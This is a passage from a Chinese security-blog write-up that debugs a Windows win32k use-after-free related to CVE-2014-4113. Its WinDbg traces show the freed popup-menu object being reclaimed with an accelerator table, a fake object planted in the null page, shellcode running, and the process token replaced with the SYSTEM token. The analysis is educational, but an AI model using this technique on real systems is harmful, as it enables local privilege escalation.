class="brush:plain;toolbar:false">.text:BF939530&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;edi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Address
+.text:BF939531&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;edi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;UnicodeString
+.text:BF939532&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;1F0h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;MbString
+.text:BF939537&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;P
+.text:BF939538&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;_xxxSendMessage@16&nbsp;;&nbsp;xxxSendMessage(x,x,x,x)
+.text:BF93953D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;eax
+.text:BF93953F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jnz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;short&nbsp;loc_BF939583
+.text:BF939541&nbsp;;&nbsp;68:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xxxMNHideNextHierarchy(v9);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;漏洞触发关键位置</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这样的话，我们销毁窗口，并且进行占位，首先在调用SendMessage触发hook之前，我们来看一下当前tagPopupMenu对象池空间仍然是tagPopupMenu对象。</span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;p
+win32k!xxxMNMouseMove+0x149:
+0008:919f8282&nbsp;e8f5c3f8ff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;win32k!xxxSendMessage&nbsp;(9198467c)
+kd&gt;&nbsp;!pool&nbsp;ffaa6d90
+Pool&nbsp;page&nbsp;ffaa6d90&nbsp;region&nbsp;is&nbsp;Paged&nbsp;session&nbsp;pool
+&nbsp;ffaa6000&nbsp;size:&nbsp;&nbsp;8e0&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Gla1
+&nbsp;ffaa68e0&nbsp;size:&nbsp;&nbsp;&nbsp;50&nbsp;previous&nbsp;size:&nbsp;&nbsp;8e0&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Ustm
+&nbsp;ffaa6930&nbsp;size:&nbsp;&nbsp;&nbsp;b8&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;50&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Uspp
+&nbsp;ffaa69e8&nbsp;size:&nbsp;&nbsp;&nbsp;b8&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;b8&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Uspp
+&nbsp;ffaa6aa0&nbsp;size:&nbsp;&nbsp;158&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;b8&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;UsDI
+&nbsp;ffaa6bf8&nbsp;size:&nbsp;&nbsp;158&nbsp;previous&nbsp;size:&nbsp;&nbsp;158&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;UsDI
+&nbsp;ffaa6d50&nbsp;size:&nbsp;&nbsp;&nbsp;10&nbsp;previous&nbsp;size:&nbsp;&nbsp;158&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Glnk
+&nbsp;ffaa6d60&nbsp;size:&nbsp;&nbsp;&nbsp;18&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;10&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Ggls
+&nbsp;ffaa6d78&nbsp;size:&nbsp;&nbsp;&nbsp;10&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;18&nbsp;&nbsp;(Free)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Usqm
+*ffaa6d88&nbsp;size:&nbsp;&nbsp;&nbsp;40&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;10&nbsp;&nbsp;(Allocated)&nbsp;*Uspm&nbsp;Process:&nbsp;8637d6a8
+Pooltag&nbsp;Uspm&nbsp;:&nbsp;USERTAG_POPUPMENU,&nbsp;Binary&nbsp;:&nbsp;win32k!MNAllocPopup
+&nbsp;ffaa6dc8&nbsp;size:&nbsp;&nbsp;&nbsp;20&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;40&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Ussy
+&nbsp;ffaa6de8&nbsp;size:&nbsp;&nbsp;&nbsp;18&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;20&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Ggls
+&nbsp;ffaa6e00&nbsp;size:&nbsp;&nbsp;&nbsp;78&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;18&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Gpfe
+&nbsp;ffaa6e78&nbsp;size:&nbsp;&nbsp;&nbsp;50&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;78&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Ttfd
+&nbsp;ffaa6ec8&nbsp;size:&nbsp;&nbsp;&nbsp;48&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;50&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Gffv
+&nbsp;ffaa6f10&nbsp;size:&nbsp;&nbsp;&nbsp;70&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;48&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Ghab
+&nbsp;ffaa6f80&nbsp;size:&nbsp;&nbsp;&nbsp;10&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;70&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Glnk
+&nbsp;ffaa6f90&nbsp;size:&nbsp;&nbsp;&nbsp;70&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;10&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Ghab</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">随后，我们调用hook返回后，再次看一下tagPopupMenu对象位置</span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;p
+win32k!xxxMNMouseMove+0x14e://tagPOPUPMENU被释放，出现40size的free空间，用Accelerator再次占位
+0008:919f8287&nbsp;85c0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test&nbsp;&nbsp;&nbsp;&nbsp;eax,eax
+kd&gt;&nbsp;!pool&nbsp;ffaa6d90
+Pool&nbsp;page&nbsp;ffaa6d90&nbsp;region&nbsp;is&nbsp;Paged&nbsp;session&nbsp;pool
+&nbsp;ffaa6000&nbsp;size:&nbsp;&nbsp;8e0&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Gla1
+&nbsp;ffaa68e0&nbsp;size:&nbsp;&nbsp;&nbsp;50&nbsp;previous&nbsp;size:&nbsp;&nbsp;8e0&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Ustm
+&nbsp;ffaa6930&nbsp;size:&nbsp;&nbsp;&nbsp;b8&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;50&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Uspp
+&nbsp;ffaa69e8&nbsp;size:&nbsp;&nbsp;&nbsp;b8&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;b8&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Uspp
+&nbsp;ffaa6aa0&nbsp;size:&nbsp;&nbsp;158&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;b8&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;UsDI
+&nbsp;ffaa6bf8&nbsp;size:&nbsp;&nbsp;158&nbsp;previous&nbsp;size:&nbsp;&nbsp;158&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;UsDI
+&nbsp;ffaa6d50&nbsp;size:&nbsp;&nbsp;&nbsp;10&nbsp;previous&nbsp;size:&nbsp;&nbsp;158&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Glnk
+&nbsp;ffaa6d60&nbsp;size:&nbsp;&nbsp;&nbsp;18&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;10&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Ggls
+&nbsp;ffaa6d78&nbsp;size:&nbsp;&nbsp;&nbsp;10&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;18&nbsp;&nbsp;(Free)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Usqm
+*ffaa6d88&nbsp;size:&nbsp;&nbsp;&nbsp;40&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;10&nbsp;&nbsp;(Allocated)&nbsp;*Usac&nbsp;Process:&nbsp;8637d6a8
+Pooltag&nbsp;Usac&nbsp;:&nbsp;USERTAG_ACCEL,&nbsp;Binary&nbsp;:&nbsp;win32k!_CreateAcceleratorTable</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">已经被Accelerator对象占位了，这样，由于Use After Free的原因，在进入xxxMNHideNextHierarchy函数前，没有对tagPopupMenu值是否有效进行检查，而是直接引用了tagACCEL+0xc位置的值，这个值正好是cAccel也就是我们可控的一个值，这个值，为了令pool size大小和tagPopupMenu相同，所以这个值为0x5。</span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;p//esi的值为占用tagPopupMenu的tagACCEL，+0xC为caccel
+win32k!xxxMNHideNextHierarchy+0x2f:
+0008:919ea12e&nbsp;8b460c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[esi+0Ch]
+kd&gt;&nbsp;p
+win32k!xxxMNHideNextHierarchy+0x32:
+0008:919ea131&nbsp;3b461c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[esi+1Ch]
+kd&gt;&nbsp;p
+win32k!xxxMNHideNextHierarchy+0x35:
+0008:919ea134&nbsp;740f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;win32k!xxxMNHideNextHierarchy+0x46&nbsp;(919ea145)
+kd&gt;&nbsp;r&nbsp;eax//tagPopupMenu由于释放并占位，变成了0x5
+eax=00000005
+kd&gt;&nbsp;p
+win32k!xxxMNHideNextHierarchy+0x37:
+0008:919ea136&nbsp;6a00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;0
+kd&gt;&nbsp;p
+win32k!xxxMNHideNextHierarchy+0x39:
+0008:919ea138&nbsp;6a00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;0
+kd&gt;&nbsp;p
+win32k!xxxMNHideNextHierarchy+0x3b:
+0008:919ea13a&nbsp;68e4010000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;1E4h
+kd&gt;&nbsp;p
+win32k!xxxMNHideNextHierarchy+0x40:
+0008:919ea13f&nbsp;50&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;eax
+kd&gt;&nbsp;p
+win32k!xxxMNHideNextHierarchy+0x41:
+0008:919ea140&nbsp;e837a5f9ff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;win32k!xxxSendMessage&nbsp;(9198467c)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这样，我们就需要在0x5，也就是零页的对应的位置构造fake popupmenu绕过内层函数的各处判断。接下来向内层继续传递，和CVE-2014-4113的利用过程就基本一致了。</span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;p
+win32k!xxxSendMessage+0x23:
+905e95c0&nbsp;e882fdffff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;win32k!xxxSendMessageTimeout&nbsp;(905e9347)
+kd&gt;&nbsp;dd&nbsp;esp
+92dd3a14&nbsp;&nbsp;00000005&nbsp;000001e4&nbsp;00000000&nbsp;00000000</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">最后，执行到shellcode</span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;p
+win32k!xxxSendMessageTimeout+0x1a9:
+905e94f0&nbsp;ff5660&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[esi+60h]
+kd&gt;&nbsp;r&nbsp;esi
+esi=00000005
+kd&gt;&nbsp;dd&nbsp;esi+60
+00000065&nbsp;&nbsp;00371410&nbsp;00000000&nbsp;00000000&nbsp;00000000
+kd&gt;&nbsp;p
+Breakpoint&nbsp;6&nbsp;hit
+00371410&nbsp;55&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;ebp</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">下一个写入断点</span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;!process&nbsp;0&nbsp;0
+****&nbsp;NT&nbsp;ACTIVE&nbsp;PROCESS&nbsp;DUMP&nbsp;****
+PROCESS&nbsp;841bdab0&nbsp;&nbsp;SessionId:&nbsp;none&nbsp;&nbsp;Cid:&nbsp;0004&nbsp;&nbsp;&nbsp;&nbsp;Peb:&nbsp;00000000&nbsp;&nbsp;ParentCid:&nbsp;0000
+&nbsp;&nbsp;&nbsp;&nbsp;DirBase:&nbsp;00185000&nbsp;&nbsp;ObjectTable:&nbsp;87c01be8&nbsp;&nbsp;HandleCount:&nbsp;490.
+&nbsp;&nbsp;&nbsp;&nbsp;Image:&nbsp;System
+PROCESS&nbsp;845da8a8&nbsp;&nbsp;SessionId:&nbsp;1&nbsp;&nbsp;Cid:&nbsp;0ddc&nbsp;&nbsp;&nbsp;&nbsp;Peb:&nbsp;7ffdf000&nbsp;&nbsp;ParentCid:&nbsp;0cf8
+&nbsp;&nbsp;&nbsp;&nbsp;DirBase:&nbsp;3f321500&nbsp;&nbsp;ObjectTable:&nbsp;95b440f0&nbsp;&nbsp;HandleCount:&nbsp;&nbsp;28.
+&nbsp;&nbsp;&nbsp;&nbsp;Image:&nbsp;EoP_1.exe
+kd&gt;&nbsp;dd&nbsp;845da8a8+f8
+845da9a0&nbsp;&nbsp;86094613&nbsp;000078da&nbsp;00000000&nbsp;00000000原进程token</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">shellcode进行替换</span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;dd&nbsp;845da8a8+f8&nbsp;//提权Token
+845da9a0&nbsp;&nbsp;87c01337&nbsp;000078da&nbsp;00000000&nbsp;00000000
+kd&gt;&nbsp;dd&nbsp;841bdab0+f8&nbsp;//系统Token
+841bdba8&nbsp;&nbsp;87c01337&nbsp;00000000&nbsp;00000000&nbsp;00000000</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在是system的token了，这里我在调试的时候发现，程序完成提权后，无法正确关闭窗口，这样我在WndProc中加入了一个PostMessage，传递的消息是WM_CLOSE用来关闭窗口，最后完成提权，放一个提权后的截图</span><br/></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><img src="http://p6.qhimg.com/t019eb54e86898a19d5.png" title="t01f6e539289355e32c.png" alt="http://p2.qhimg.com/t01f6e539289355e32c.png"/></span></p><p style="text-indent: 2em; text-align: left;"></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个漏洞总体来说可以算是CVE-2014-4113的进阶，和内核较劲的过程非常有意思，一步步的思考和绕过，让我想起以前膜拜大牛们过狗的案例中一步步bypass的过程，实际上二进制也是一样。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">那么这篇文章也写到这里，希望大牛们多多批评指正，也希望大家也都能有所收获，谢谢！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; color: rgb(0, 112, 192);"><strong>传送门</strong></span></p><hr style="white-space: normal;"/><p style="white-space: normal; text-indent: 2em;"><a href="http://bobao.360.cn/learning/detail/3170.html" target="_blank" style="text-decoration: none;"><span style="color: rgb(0, 112, 192);"><strong style="text-decoration: none; color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; text-indent: 2em;">【技术分享】经典内核漏洞调试笔记</strong><strong style="text-decoration: none; color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; text-indent: 2em;"></strong></span></a></p><p style="text-align: center;"><br/></p></p>
+                <hr/>
+                <p style="text-align: center;">
+                    <img src="http://bobao.360.cn/img/app.jpeg"/>
+                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
+                </p>
+                                <p>本文由 安全客 原创发布，如需转载请注明来源及本文地址。<br/>本文地址：http://bobao.360.cn/learning/detail/3184.html
+                </p>
+                            </div>
+            <div style="margin-top: 20px;background-color:#FFFFFF">
+    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】经典内核漏洞调试笔记之二 - 安全客 - 有思想的安全新媒体" />
+    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
+    <a name="mao"></a>
+    <div class="reg-log mobile-hiden">
+        <div class="" id="userTo">   
+            <div id="to-list" class="input-text" style="">
+                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
+                <ul id="preadded" style="display:none">       
+                </ul>
+                <div id="to-auto" style="width: 200px">
+                    <ul id="feed">
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" id="source-id" value="3184" />
+        <input type="hidden" id="source-type" value="learning" />
+        <input type="hidden" id="post-comment-url" value="/comment/add" />
+        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
+        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
+        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
+            </div>
+    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
+        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
+        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />
+
+        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
+    </div>
+
+
+    <div class="clearfix"></div>
+    <div class="comments">
+        <div class="comments-head">
+            <span class="title">用户评论</span>
+        </div>
+                <div class="comment-none alarm-info bg-primary">无任何评论</div>
+            </div>
+</div>
+<script>
+    $(function () {
+        $('.anonymous-comment').click(function () {
+            $(".join").hide();
+            $(".reg-log textarea").first().removeAttr("disabled").show();
+            $('#use_nickname').val('1');
+//            $('#trigger-nickname').attr('checked', true);
+            $('#trigger-nickname').trigger('click');
+        });
+        //为所有复选框绑定事件
+//        checkbox_on_click();
+        //ajax随机获取昵称
+//        randnicknameajax(0);
+        //ajax检测登录状态
+        comment_check_login();
+    });
+
+
+
+    function input_checkbox(flag) {
+        $('input:checkbox').each(function () {
+            var value = flag ? 1 : 0;
+            $(this).prop('checked', flag);
+            $(this).val(value);
+        });
+    }
+
+//ajax随机获取昵称
+    function randnicknameajax(flag) {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-nickname-url-ajax').val(),
+            data: {limit: 1, flag: flag},
+            dataType: "json",
+            success: function (data) {
+                $('#nick-name').val(data.data[0]);
+                _nick_name=data.data[0];
+            }
+        });
+    }
+    $();
+//ajax检测登录状态
+    function comment_check_login() {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-check-login-url-ajax').val(),
+            data: {},
+            dataType: "json",
+            success: function (data) {
+                if (data.success) {
+                    $('.join').hide();
+                    $(".reg-log textarea").first().removeAttr("disabled").show();
+                    $("#span_use_nickname").show();
+                    $('#use_nickname').val('0');
+                    $('#use_nickname').attr('checked', false);
+                }
+            }
+        });
+    }
+</script>        </div>
+    </div>
+    <div class="side-bar">
+        <div class="mod hot-news">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
+    </div>
+    <ul class="links-list">
+                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
+                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
+                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
+                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
+                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
+                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
+            </ul>
+</div>        <!-- 友情链接 -->
+        <div class="mod blog-links mobile-hide">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
+        <a href="/links/index.html" class="more">更多<i></i></a>
+    </div>
+        <ul class="links-list">
+                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
+                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
+                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
+                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
+                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
+                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
+                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
+                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
+                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
+                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
+            </ul>
+    </div>
+        <!-- 联系我们 -->
+        <div class="mod contact mobile-hide" style="text-align:center">
+    <div class="head-bar clearfix">
+        <h2><i></i><span>关注我们</span></h2>
+    </div>
+    <!-- 微信关注 -->
+    <ul class="contact-way">
+        <li><a>微信关注</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+    <!-- APP下载 -->
+    <ul class="contact-way">
+        <li><a>安全播报APP</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+</div>
+
+    </div>
+</div>
+
+<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/common.js?v=4.5"></script>
+<script>$(function() {sync_count('comment');});</script>
+
+
+<!-- 语法高亮 -->
+<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
+<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
+    </div>
+
+        <div class="footer">
+        <div class="friend-link">
+            <a href="http://www.360.cn/" target="_blank">360首页</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">关于我们</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">联系我们</a>
+            <span>|</span>
+            <a href="/links/index.html" target="_blank">友情链接</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">招贤纳士</a>
+        </div>
+        <div class="copy">
+            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
+        </div>
+    </div>
+    
+</div>
+
+<!--奇舞团统计-->
+
+<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
+<script>
+    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
+</script>
+
+<div class="hide">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
+</div>
+<div class="backToTop_wrap off">
+    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
+</div>
+<script>
+    var $backToTop_wrap = $(".backToTop_wrap"),
+        $backToTop_btn = $("#back_to_top");
+
+    if ($(window).scrollTop() > 100) {
+        $backToTop_wrap.removeClass("off");
+    }
+    else {
+        $backToTop_wrap.addClass("off");
+    }
+
+    $(window).on("scroll", function () {
+        if ($(this).scrollTop() > 100) {
+            $backToTop_wrap.removeClass("off");
+        }
+        else {
+            $backToTop_wrap.addClass("off");
+        }
+    });
+
+    $backToTop_btn.on("click", function () {
+        $("html, body").animate({scrollTop: 0}, 120);
+    });
+
+    $(function () {
+        var navlist = $('.nav-list > li');
+
+        navlist.each(function () {
+            $(this).on('mouseenter', function () {
+                $(this).addClass('selected');
+            });
+
+            $(this).on('mouseleave', function () {
+                $(this).removeClass('selected');
+            });
+        });
+    })
+</script>
+
+
+
+</body>
+</html>
